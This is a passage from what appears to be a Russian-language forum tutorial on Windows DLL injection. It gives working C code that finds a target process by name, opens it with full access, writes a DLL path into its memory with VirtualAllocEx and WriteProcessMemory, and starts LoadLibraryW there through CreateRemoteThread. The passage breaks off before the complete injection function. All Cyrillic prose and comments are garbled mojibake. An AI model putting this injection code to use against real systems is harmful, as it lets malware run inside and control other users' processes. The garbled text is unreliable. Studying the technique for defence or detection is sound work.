    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–ª–µ–¥—É—é—â–µ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –≤ —Å–Ω–∏–º–∫–µ.
    // –ü–æ–∫–∞ –≤ —Å–Ω–∏–º–∫–µ –µ—â–µ –æ—Å—Ç–∞–µ—Ç—Å—è –ø—Ä–æ—Ü–µ—Å—Å, –ø—Ä–æ–¥–æ–ª–∂–∞–π—Ç–µ —Ü–∏–∫–ª
    } while (Process32Next(hSnapShot, &amp;Proc));

    // –û—á–∏—Å—Ç–∫–∞ —Ä–µ—Å—É—Ä—Å–æ–≤
    _EndOfFunction:
        if (hSnapShot != NULL)
            CloseHandle(hSnapShot);
        if (*dwProcessId == NULL || *hProcess == NULL)
            return FALSE;
        return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ß—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∫ —Ä–µ–≥–∏—Å—Ç—Ä—É –≤ –∏–º–µ–Ω–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞</b><br />
<br />
–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –≤—ã—à–µ –∫–æ–¥–æ–≤—ã–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç —Å–æ–¥–µ—Ä–∂–∏—Ç –æ–¥–∏–Ω –Ω–µ–¥–æ—á–µ—Ç, –∫–æ—Ç–æ—Ä—ã–π –±—ã–ª —É–ø—É—â–µ–Ω –∏ –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –Ω–µ–≤–µ—Ä–Ω—ã–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º. –§—É–Ω–∫—Ü–∏—è wcscmp –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∞—Å—å –¥–ª—è —Å—Ä–∞–≤–Ω–µ–Ω–∏—è –∏–º–µ–Ω –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, –Ω–æ –ø—Ä–∏ —ç—Ç–æ–º –Ω–µ —É—á–∏—Ç—ã–≤–∞–ª–∞—Å—å —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∫ —Ä–µ–≥–∏—Å—Ç—Ä—É, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ Process1.exe –∏ process1.exe –±—É–¥—É—Ç —Å—á–∏—Ç–∞—Ç—å—Å—è –¥–≤—É–º—è —Ä–∞–∑–Ω—ã–º–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏.<br />
<br />
–í –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –Ω–∏–∂–µ –∫–æ–¥–æ–≤–æ–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ —ç—Ç–æ—Ç –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ–∫ —É—Å—Ç—Ä–∞–Ω–µ–Ω –ø—É—Ç–µ–º –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –∑–Ω–∞—á–µ–Ω–∏—è –≤ —á–ª–µ–Ω–µ Proc.szExeFile –≤ —Å—Ç—Ä–æ–∫—É –≤ –Ω–∏–∂–Ω–µ–º —Ä–µ–≥–∏—Å—Ç—Ä–µ, –∞ –∑–∞—Ç–µ–º —Å—Ä–∞–≤–Ω–µ–Ω–∏—è –µ–≥–æ —Å–æ szProcessName.<br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, szProcessName –≤—Å–µ–≥–¥–∞ –¥–æ–ª–∂–µ–Ω –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å—Å—è –≤ –≤–∏–¥–µ —Å—Ç—Ä–æ–∫–∏ –≤ –Ω–∏–∂–Ω–µ–º —Ä–µ–≥–∏—Å—Ç—Ä–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

    // –°–æ–≥–ª–∞—Å–Ω–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏:
    // –ü–µ—Ä–µ–¥ –≤—ã–∑–æ–≤–æ–º —Ñ—É–Ω–∫—Ü–∏–∏ Process32First —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —ç—Ç–æ—Ç —á–ª–µ–Ω –≤ sizeof(PROCESSENTRY32).
    // –ï—Å–ª–∏ dwSize –Ω–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω, Process32First –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è –Ω–µ—É–¥–∞—á–µ–π.
    PROCESSENTRY32    Proc = {
        .dwSize = sizeof(PROCESSENTRY32)
    };

    HANDLE hSnapShot = NULL;

    // –°–æ–∑–¥–∞–µ—Ç —Å–Ω–∏–º–æ–∫ –≤—Å–µ—Ö –≤ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç –≤—ã–ø–æ–ª–Ω—è—é—â–∏—Ö—Å—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE){
        printf(&quot;[!] CreateToolhelp32Snapshot Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–µ—Ä–≤–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –≤ —Å–Ω–∏–º–∫–µ.
    if (!Process32First(hSnapShot, &amp;Proc)) {
        printf(&quot;[!] Process32First Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    do {
        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {
            DWORD    dwSize = lstrlenW(Proc.szExeFile);
            DWORD   i = 0;

            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

            // –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –∫–∞–∂–¥–æ–≥–æ —Å–∏–º–≤–æ–ª–∞ –≤ Proc.szExeFile –≤ —Å–∏–º–≤–æ–ª –Ω–∏–∂–Ω–µ–≥–æ —Ä–µ–≥–∏—Å—Ç—Ä–∞
            // –∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –µ–≥–æ –≤ LowerName
            if (dwSize &lt; MAX_PATH * 2) {
                for (; i &lt; dwSize; i++)
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

                LowerName[i++] = &#039;\0&#039;;
            }
        }

        // –ï—Å–ª–∏ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–Ω–æ–µ –≤ –Ω–∏–∂–Ω–∏–π —Ä–µ–≥–∏—Å—Ç—Ä –∏–º—è –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å –∏—Å–∫–æ–º—ã–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º
        if (wcscmp(LowerName, szProcessName) == 0) {
            // –°–æ—Ö—Ä–∞–Ω–∏—Ç–µ PID
            *dwProcessId = Proc.th32ProcessID;
            // –û—Ç–∫—Ä–æ–π—Ç–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞
            *hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());

            break;
        }

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–ª–µ–¥—É—é—â–µ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –≤ —Å–Ω–∏–º–∫–µ.
    // –ü–æ–∫–∞ –≤ —Å–Ω–∏–º–∫–µ –µ—â–µ –æ—Å—Ç–∞–µ—Ç—Å—è –ø—Ä–æ—Ü–µ—Å—Å, –ø—Ä–æ–¥–æ–ª–∂–∞–π—Ç–µ —Ü–∏–∫–ª
    } while (Process32Next(hSnapShot, &amp;Proc));

    // –û—á–∏—Å—Ç–∫–∞ —Ä–µ—Å—É—Ä—Å–æ–≤
    _EndOfFunction:
        if (hSnapShot != NULL)
            CloseHandle(hSnapShot);
        if (*dwProcessId == NULL || *hProcess == NULL)
            return FALSE;
        return TRUE;
    }</code></pre>
	</div>
</div><br />
<b>–ò–Ω—ä–µ–∫—Ü–∏—è DLL</b><br />
<br />
–î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –±—ã–ª —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω. –°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º –±—É–¥–µ—Ç –∏–Ω—ä–µ–∫—Ü–∏—è DLL –≤ —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å, –¥–ª—è –∫–æ—Ç–æ—Ä–æ–≥–æ –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö —Ä–∞–Ω–µ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω—ã—Ö Windows API, –∞ —Ç–∞–∫–∂–µ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –Ω–æ–≤—ã—Ö.<br />
<br />
VirtualAllocEx - –ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ VirtualAlloc, –∑–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º —Ç–æ–≥–æ, —á—Ç–æ –æ–Ω –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤—ã–¥–µ–ª—è—Ç—å –ø–∞–º—è—Ç—å –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
WriteProcessMemory - –ó–∞–ø–∏—Å—ã–≤–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å. –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ –æ–Ω –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –∑–∞–ø–∏—Å–∏ –ø—É—Ç–∏ –∫ DLL –≤ —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å.<br />
<br />
CreateRemoteThread - –°–æ–∑–¥–∞–µ—Ç –ø–æ—Ç–æ–∫ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
<b>–û–±–∑–æ—Ä –∫–æ–¥–∞</b><br />
<br />
–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ –±—É–¥–µ—Ç —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω –∫–æ–¥ –∏–Ω—ä–µ–∫—Ü–∏–∏ DLL (–ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ). –§—É–Ω–∫—Ü–∏—è InjectDllToRemoteProcess –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–≤–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞:<br />
<br />
–î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞ - —ç—Ç–æ HANDLE –∫ —Ü–µ–ª–µ–≤–æ–º—É –ø—Ä–æ—Ü–µ—Å—Å—É, –≤ –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –∏–Ω—ä–µ—Ü–∏—Ä–æ–≤–∞–Ω DLL.<br />
–ò–º—è DLL - –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ DLL, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –∏–Ω—ä–µ—Ü–∏—Ä–æ–≤–∞–Ω –≤ —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å.<br />
<br />
<b>–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ LoadLibraryW</b><br />
<br />
LoadLibraryW –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ DLL –≤ –ø—Ä–æ—Ü–µ—Å—Å, –∫–æ—Ç–æ—Ä—ã–π –µ–≥–æ –≤—ã–∑—ã–≤–∞–µ—Ç. –ü–æ—Å–∫–æ–ª—å–∫—É —Ü–µ–ª—å—é —è–≤–ª—è–µ—Ç—Å—è –∑–∞–≥—Ä—É–∑–∫–∞ DLL –≤ —É–¥–∞–ª–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å, –∞ –Ω–µ –≤ –ª–æ–∫–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å, –æ–Ω –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –≤—ã–∑–≤–∞–Ω –Ω–∞–ø—Ä—è–º—É—é.<br />
<br />
–í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–ª—É—á–∏—Ç—å –∞–¥—Ä–µ—Å LoadLibraryW –∏ –ø–µ—Ä–µ–¥–∞—Ç—å –µ–≥–æ —Å–æ–∑–¥–∞–Ω–Ω–æ–º—É —É–¥–∞–ª–µ–Ω–Ω–æ–º—É –ø–æ—Ç–æ–∫—É –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ, –ø–µ—Ä–µ–¥–∞–≤–∞—è –∏–º—è DLL –≤ –∫–∞—á–µ—Å—Ç–≤–µ –µ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç–∞.<br />
–≠—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø–æ—Ç–æ–º—É —á—Ç–æ –∞–¥—Ä–µ—Å WinAPI LoadLibraryW –±—É–¥–µ—Ç —Ç–∞–∫–∏–º –∂–µ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ, –∫–∞–∫ –∏ –≤ –ª–æ–∫–∞–ª—å–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ. –ß—Ç–æ–±—ã –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –∞–¥—Ä–µ—Å WinAPI, –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è GetProcAddress –∏ GetModuleHandle.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// LoadLibrary —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç—Å—è kernel32.dll
// –ü–æ—ç—Ç–æ–º—É –ø–æ–ª—É—á–µ–Ω –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä kernel32.dll, –∞ –∑–∞—Ç–µ–º –∞–¥—Ä–µ—Å LoadLibraryW
pLoadLibraryW = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;);</code></pre>
	</div>
</div><br />
–ê–¥—Ä–µ—Å, —Ö—Ä–∞–Ω—è—â–∏–π—Å—è –≤ pLoadLibraryW, –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞ –ø–æ—Ç–æ–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
<b>–í—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏</b><br />
<br />
–°–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è –≤—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ, –∫–æ—Ç–æ—Ä–æ–µ –º–æ–∂–µ—Ç –≤–º–µ—Å—Ç–∏—Ç—å –∏–º—è DLL, DllName. –î–ª—è –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è VirtualAllocEx.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –í—ã–¥–µ–ª—è–µ—Ç –ø–∞–º—è—Ç—å —Ä–∞–∑–º–µ—Ä–æ–º dwSizeToWrite (—ç—Ç–æ —Ä–∞–∑–º–µ—Ä –∏–º–µ–Ω–∏ dll) –≤–Ω—É—Ç—Ä–∏ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, hProcess.
// –ó–∞—â–∏—Ç–∞ –ø–∞–º—è—Ç–∏ - –ß—Ç–µ–Ω–∏–µ-–ó–∞–ø–∏—Å—å
pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</code></pre>
	</div>
</div><br />
<b>–ó–∞–ø–∏—Å—å –≤ –≤—ã–¥–µ–ª–µ–Ω–Ω—É—é –ø–∞–º—è—Ç—å</b><br />
<br />
–ü–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å WriteProcessMemory –¥–ª—è –∑–∞–ø–∏—Å–∏ –≤ –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä. –ò–º—è DLL –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç—Å—è –≤ —Ä–∞–Ω–µ–µ –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä –ø–∞–º—è—Ç–∏.<br />
<br />
–§—É–Ω–∫—Ü–∏—è WinAPI WriteProcessMemory –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º –Ω–∞ –æ—Å–Ω–æ–≤–µ –µ–µ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,               // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞, –ø–∞–º—è—Ç—å –∫–æ—Ç–æ—Ä–æ–≥–æ –±—É–¥–µ—Ç –∑–∞–ø–∏—Å–∞–Ω–∞
  [in]  LPVOID  lpBaseAddress,          // –ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –≤ —É–∫–∞–∑–∞–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ, –≤ –∫–æ—Ç–æ—Ä—ã–π –±—É–¥—É—Ç –∑–∞–ø–∏—Å–∞–Ω—ã –¥–∞–Ω–Ω—ã–µ
  [in]  LPCVOID lpBuffer,               // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –±—É—Ñ–µ—Ä, —Å–æ–¥–µ—Ä–∂–∞—â–∏–π –¥–∞–Ω–Ω—ã–µ –¥–ª—è –∑–∞–ø–∏—Å–∏ –≤ &#039;lpBaseAddress&#039;
  [in]  SIZE_T  nSize,                  // –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–∞–π—Ç, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –∑–∞–ø–∏—Å–∞–Ω—ã –≤ —É–∫–∞–∑–∞–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å.
  [out] SIZE_T  *lpNumberOfBytesWritten // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é &#039;SIZE_T&#039;, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∞–µ—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏ –∑–∞–ø–∏—Å–∞–Ω–Ω—ã—Ö –±–∞–π—Ç–æ–≤
);</code></pre>
	</div>
</div><br />
–ù–∞ –æ—Å–Ω–æ–≤–µ –ø–æ–∫–∞–∑–∞–Ω–Ω—ã—Ö –≤—ã—à–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ WriteProcessMemory, –µ–≥–æ –º–æ–∂–Ω–æ –≤—ã–∑–≤–∞—Ç—å —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º, –∑–∞–ø–∏—Å—ã–≤–∞—è –±—É—Ñ–µ—Ä (DllName) –≤ –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π –∞–¥—Ä–µ—Å (pAddress), –≤–æ–∑–≤—Ä–∞—â–µ–Ω–Ω—ã–π —Ä–∞–Ω–µ–µ –≤—ã–∑–≤–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–µ–π VirtualAllocEx.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ó–∞–ø–∏—Å–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ - —ç—Ç–æ –∏–º—è DLL, &#039;DllName&#039;, —Ä–∞–∑–º–µ—Ä–æ–º &#039;dwSizeToWrite&#039;
SIZE_T lpNumberOfBytesWritten = NULL;
WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &amp;lpNumberOfBytesWritten)</code></pre>
	</div>
</div><br />
<b>–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —á–µ—Ä–µ–∑ –Ω–æ–≤—ã–π –ø–æ—Ç–æ–∫</b><br />
<br />
–ü–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –∑–∞–ø–∏—Å–∏ –ø—É—Ç–∏ –∫ DLL –≤ –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π –±—É—Ñ–µ—Ä –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è CreateRemoteThread –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
–ó–¥–µ—Å—å —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–º –∞–¥—Ä–µ—Å LoadLibraryW.<br />
pLoadLibraryW –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ –∞–¥—Ä–µ—Å–∞ –ø–æ—Ç–æ–∫–∞, –∑–∞—Ç–µ–º pAddress, —Å–æ–¥–µ—Ä–∂–∞—â–∏–π –∏–º—è DLL, –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –≤—ã–∑–æ–≤–∞ LoadLibraryW. –≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –ø—É—Ç–µ–º –ø–µ—Ä–µ–¥–∞—á–∏ pAddress –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ lpParameter —Ñ—É–Ω–∫—Ü–∏–∏ CreateRemoteThread.<br />
<br />
–ü–∞—Ä–∞–º–µ—Ç—Ä—ã CreateRemoteThread —Ç–∞–∫–∏–µ –∂–µ, –∫–∞–∫ —É —Ñ—É–Ω–∫—Ü–∏–∏ CreateThread, –æ–ø–∏—Å–∞–Ω–Ω–æ–π —Ä–∞–Ω–µ–µ, –∑–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ HANDLE hProcess, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞, –≤ –∫–æ—Ç–æ—Ä–æ–º –±—É–¥–µ—Ç —Å–æ–∑–¥–∞–Ω –ø–æ—Ç–æ–∫.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –¢–æ—á–∫–∞ –≤—Ö–æ–¥–∞ –ø–æ—Ç–æ–∫–∞ –±—É–¥–µ—Ç &#039;pLoadLibraryW&#039;, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è –∞–¥—Ä–µ—Å–æ–º LoadLibraryW
// –ò–º—è DLL, pAddress, –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –¥–ª—è LoadLibrary
HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);</code></pre>
	</div>
</div><br />
<b>–ò–Ω—ä–µ–∫—Ü–∏—è DLL - –ü–æ–Ω—ã–π –∫–æ–¥ —Ñ—É–Ω–∫—Ü–∏–∏ InjectDllToRemoteProcess</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
